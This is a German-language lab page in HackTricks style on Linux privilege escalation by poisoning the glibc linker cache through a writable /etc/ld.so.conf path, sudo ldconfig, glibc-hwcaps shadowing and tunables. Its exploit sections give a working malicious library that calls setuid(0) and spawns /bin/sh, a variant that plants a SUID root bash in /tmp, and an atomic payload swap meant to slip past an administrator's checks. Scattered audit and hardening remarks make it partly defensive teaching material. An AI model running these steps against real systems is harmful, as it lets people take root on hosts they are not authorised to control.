# Beispiel für einen ld.so-privesc-exploit

{{#include ../../banners/hacktricks-training.md}}

Diese Seite ist ein fokussiertes Lab zum Vergiften des **System-Linker-Caches über `/etc/ld.so.conf` oder `ldconfig`**. Informationen zu Injection fehlender Libraries, beschreibbarem `RPATH`/`RUNPATH`, `LD_PRELOAD` und anderem generischem SUID-Linker-Abuse findest du unter [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Umgebung vorbereiten

Im folgenden Abschnitt findest du den Code der Dateien, die wir zur Vorbereitung der Umgebung verwenden werden.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Erstelle** diese Dateien auf deinem Rechner im selben Ordner
2. **Kompiliere die** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopiere** `libcustom.so` nach `/usr/lib` und aktualisiere den Cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root-Rechte)
4. **Kompiliere die** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Überprüfe die Umgebung

Überprüfe, dass _libcustom.so_ aus _/usr/lib_ **geladen** wird und dass du die Binary **ausführen** kannst.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Nützliche Triage-Befehle

Beim Angriff auf ein echtes Ziel solltest du den **genauen Namen der Bibliothek** überprüfen, die die Binärdatei benötigt, welche Bibliothek der Loader **aktuell auflöst**, und welche konfigurierten Pfade beschreibbar sind, ohne den aktiven Cache zu verändern.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Verwende `ldd` nur für eine **vertrauenswürdige** ausführbare Datei. Einige Implementierungen oder ungewöhnliche ELF-Interpreter können dazu führen, dass von Angreifern kontrollierter Code ausgeführt wird; `objdump -p ./file | grep NEEDED` listet direkte Abhängigkeiten sicher auf. Bei einem vertrauenswürdigen Ziel zeigt das Aufrufen des ermittelten Interpreters mit `--list` die tatsächliche Auflösung. Vergleiche diese Ausgabe mit `--inhibit-cache --list`: Ein Unterschied beweist, dass `/etc/ld.so.cache` und nicht eine gewöhnliche Search-Path-Regel das Objekt ausgewählt hat.<sup>[[1]](#references)[[4]](#references)</sup>

Ein paar nützliche Stolperfallen:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` **funktioniert** normalerweise **nicht**, weil
die Umleitung von deiner aktuellen Shell vorgenommen wird. Verwende stattdessen
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/privilegierte** Binaries werden im **Secure-Execution-Modus** ausgeführt: `LD_LIBRARY_PATH`
wird ignoriert, während `LD_PRELOAD` eingeschränkt ist (Namen mit Schrägstrichen werden
ignoriert, und nur setuid-markierte Libraries in Standardverzeichnissen dürfen
vorab geladen werden). Sobald root `ldconfig` ausführt, können in
`/etc/ld.so.conf` aufgeführte Verzeichnisse in `/etc/ld.so.cache` gelangen, sodass diese
Fehlkonfiguration weiterhin privilegierte Programme beeinflussen kann.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` wird im Secure-Execution-Modus ebenfalls ignoriert, sofern `/etc/suid-debug` nicht existiert. Erfasse den Trace daher bei einem gleichwertigen Nicht-SUID-Lauf, statt eine Ausgabe von der privilegierten Ausführung zu erwarten.<sup>[[1]](#references)</sup>
- Bei glibc 2.33 und neuer stellt der Dynamic Loader außerdem
`--list-diagnostics` bereit. Diese Option gibt maschinenlesbare Loader-Diagnosen und
Informationen zu integrierten Search-Paths aus, wenn ein Hijack nicht wie erwartet funktioniert.<sup>[[1]](#references)[[6]](#references)</sup>

### Einschränkungen bei Cache und SONAME

`ldconfig` cached nicht jede beliebige Datei in einem konfigurierten Verzeichnis: Es untersucht ELF-Header, erkennt Namen, die `lib*.so*` oder `ld-*.so*` entsprechen, und erwartet die übliche Kette `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Das injizierte Objekt muss daher die Zielarchitektur bzw. -klasse, den exakten `DT_NEEDED`-Namen (normalerweise sein `DT_SONAME`) sowie alle Symbole bzw. Versionen besitzen, die das Opfer auflöst.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Bevorzuge eine ziel-spezifische Bibliothek wie in diesem Beispiel. Das Shadowing eines gängigen SONAME mit einem unvollständigen Object kann jeden Prozess beeinträchtigen, der es auflöst, bevor das vorgesehene privilegierte Ziel ausgeführt wird.<sup>[[3]](#references)</sup>

### Persistenz von Cache-Pfaden und atomare Swaps

Der Cache speichert eine Zuordnung von **Bibliotheksnamen zu Pfadnamen**; das Shared Object wird nicht eingebettet. Nachdem ein vom Angreifer kontrollierter Pfad im Cache gespeichert wurde, wirkt sich das Ersetzen des Objects an genau diesem Pfad auf neu gestartete Prozesse aus, ohne dass ein weiterer `ldconfig`-Lauf erforderlich ist. Dies ermöglicht ein nützliches Time-of-Check/Time-of-Use-Muster: Während der Cache-Neuaufbau oder die Überprüfung durch einen Administrator eine gültige Bibliothek voraussetzt, wird die Payload anschließend atomar darüber umbenannt. Bereits laufende Prozesse behalten ihr bereits gemapptes Object.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Ebenso entfernt das Löschen der bösartigen Zeile aus `ld.so.conf` einen bereits geschriebenen Eintrag nicht automatisch: Der Administrator muss das nicht vertrauenswürdige Objekt entfernen, Eigentümerschaft und Schreibzugriff korrigieren und den Cache neu erstellen. Verwenden Sie den obigen Vergleich mit `--inhibit-cache`, um einen veralteten Cache-Eintrag von einem weiterhin aktiven Konfigurationspfad zu unterscheiden.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

In diesem Szenario nehmen wir an, dass ein Administrator einen verwundbaren Eintrag zu einer Datei unter `/etc/ld.so.conf.d/` hinzugefügt hat, die von der systemweiten `/etc/ld.so.conf` eingebunden wird.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Der verwundbare Ordner ist _/home/ubuntu/lib_ (auf den wir Schreibzugriff haben).\
**Lade** den folgenden Code herunter und **kompiliere** ihn innerhalb dieses Pfads:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Wenn du erwartest, dass **root** (oder ein anderes privilegiertes Konto) die verwundbare Binary später ausführt, ist es normalerweise besser, ein **root-owned Artifact** zu hinterlassen, anstatt eine interaktive Shell zu starten. Zum Beispiel:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Nachdem die privilegierte Ausführung erfolgt ist, kannst du `/tmp/rootbash -p` verwenden.

Nachdem wir nun die bösartige libcustom-Bibliothek im **fehlerhaft konfigurierten** Pfad erstellt haben, muss der Standard-Cache durch eine erfolgreiche privilegierte Ausführung von **`ldconfig`** neu erstellt werden. Ein Neustart hilft nur, wenn der lokale Boot-Prozess diesen Befehl tatsächlich aufruft; andernfalls musst du auf eine Aktion des Administrators warten oder eine unsichere sudo-Regel verwenden, falls eine solche verfügbar ist.<sup>[[2]](#references)</sup>

Sobald dies geschehen ist, **prüfe erneut**, von wo die ausführbare Datei `sharedvuln` die `libcustom.so`-Bibliothek lädt:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Wie du sehen kannst, wird es aus **`/home/ubuntu/lib`** geladen, und wenn ein beliebiger Benutzer es ausführt, wird eine Shell ausgeführt:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Beachte, dass wir in diesem Beispiel keine Privilegien eskaliert haben. Wenn wir jedoch die ausgeführten Befehle ändern und **darauf warten, dass root oder ein anderer privilegierter Benutzer die verwundbare Binärdatei ausführt**, können wir Privilegien eskalieren.

### Modernes `glibc-hwcaps`-Shadowing

Seit glibc 2.33 kann der Loader optimierte Bibliotheken unterhalb von `glibc-hwcaps/<level>/` innerhalb **jedes Bibliothekssuchverzeichnisses** bevorzugen. Daher ist die Überprüfung ausschließlich von `/home/ubuntu/lib` unzureichend: Ein beschreibbares kompatibles Unterverzeichnis wie `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` kann die Basisbibliothek überschreiben, nachdem `ldconfig` sie indiziert hat, während andere CPUs weiterhin das Basisobjekt verwenden. Dies ermöglicht außerdem ein architekturselektives Hijacking, das übersehen werden kann, wenn die Validierung auf einer anderen CPU erfolgt.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Die aktuellen glibc-Hardening-Empfehlungen raten dazu, doppelte SONAMEs, nicht standardmäßige Suchpfade und Objekte in `glibc-hwcaps`-Unterverzeichnissen zu vermeiden. Aus Audit-Perspektive sollten Ownership- und Schreibbarkeitsprüfungen rekursiv auf konfigurierte Verzeichnisse und deren übergeordnete Pfadkomponenten angewendet werden.<sup>[[3]](#references)</sup>

### Weitere Fehlkonfigurationen - dieselbe vuln

Im vorherigen Beispiel haben wir eine Fehlkonfiguration simuliert, bei der ein Administrator **einen nicht privilegierten Ordner innerhalb einer Konfigurationsdatei in `/etc/ld.so.conf.d/` festgelegt hat**.\
Es gibt jedoch weitere Fehlkonfigurationen, die dieselbe Schwachstelle verursachen können: Wenn du **Schreibberechtigungen** für eine geladene **config file** hast, eine Datei in einem beschreibbaren Verzeichnis `/etc/ld.so.conf.d/` erstellen kannst oder in `/etc/ld.so.conf` schreiben kannst, kannst du dieselbe Schwachstelle konfigurieren und ausnutzen.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Angenommen, du hast sudo-Berechtigungen für `ldconfig`**. `ldconfig` akzeptiert Scan-Verzeichnisse als Positionsargumente, daher ist die kürzeste Form für cache-poisoning oft einfach:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Alternativ wählt `-f` eine andere Konfigurationsdatei aus, wobei die standardmäßige Cache-Ausgabe beibehalten wird. Dies ist nützlich, wenn ein Argumentfilter positionale Verzeichnisse blockiert, `-f` aber weiterhin zulässt, oder wenn mehrere Pfade injiziert werden müssen:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Wie im **vorherigen Exploit** angegeben, **erstelle die schädliche Bibliothek innerhalb von `/tmp`**.\
Und schließlich laden wir den Pfad und überprüfen, von wo die Binärdatei die Bibliothek lädt:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Wie Sie sehen können, können Sie dieselbe Schwachstelle ausnutzen, wenn Sie sudo-Berechtigungen für `ldconfig` haben.** Die Details der Optionen sind bei der Bewertung einer eingeschränkten sudo-Regel wichtig: `-f` wählt eine andere Konfiguration aus, erstellt aber weiterhin `/etc/ld.so.cache` neu; `-C` leitet den Cache an einen anderen Ort um; `-N` verhindert die Neuerstellung des Caches; und `-X` verhindert Link-Aktualisierungen, erstellt den Cache aber **weiterhin neu, sofern es nicht mit `-N` kombiniert wird**. `-n` impliziert `-N`, kann also Links in den angegebenen Verzeichnissen aktualisieren, aber den Cache nicht vergiften; `-r` arbeitet unterhalb eines alternativen Root-Verzeichnisses und ändert normalerweise nicht den Cache des Hosts.<sup>[[2]](#references)</sup>

## glibc 2.44: zwischengespeicherte systemweite Tunables

Ab glibc 2.44 analysiert `ldconfig` außerdem `/etc/tunables.conf` und speichert dessen Einstellungen als Erweiterung in `/etc/ld.so.cache`. Die Datei akzeptiert `include`-Direktiven und Filter pro Prozess. Präfixe steuern den Geltungsbereich: `@` zielt nur auf `AT_SECURE`-Prozesse ab, `$` schließt sie aus, und `*` umfasst beide. Dadurch erweitert sich die Audit-Grenze über Bibliotheksverzeichnisse hinaus: Eine beschreibbare Tunables-Konfiguration oder eine eingebundene Datei kann zukünftige Programmstarts nach einem privilegierten Neuaufbau des Caches beeinflussen.<sup>[[7]](#references)</sup>

Dieselbe Version fügt `ldconfig -t TUNCONF` hinzu, womit eine alternative Tunables-Datei ausgewählt wird, während weiterhin der normale Cache geschrieben wird, sofern keine andere Option dies ändert. Daher müssen Wrapper und sudo-Regeln, die lediglich `-f` blockieren sollten, auch `-t`, beliebige Positionsverzeichnisse und die Manipulation der Cache-Ausgabe ablehnen.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
Dies ist keine automatische Ausführung beliebigen Codes. Es handelt sich um ein privilegiertes Primitive zur **loader-behavior manipulation**: glibc warnt ausdrücklich, dass systemweite Werte sicherheitsrelevante Tunables auf setuid/setgid-Programme anwenden können, ohne eine sicherheitsbezogene Prüfung pro Tunable. Enumeriere die tatsächlich verfügbaren Tunables des Hosts mit `--list-tunables` und suche nach zielsystemspezifischen Änderungen am Allocator, Änderungen an der CPU-Härtung oder Denial-of-Service-Bedingungen, anstatt von einem universell einsetzbaren Payload auszugehen.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Härtung des Dynamic Linkers - Die GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Diagnose des Dynamic Linkers (Die GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Systemweite Tunables (The GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Systemweite Tunables hinzufügen: ldconfig-Teil (Patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
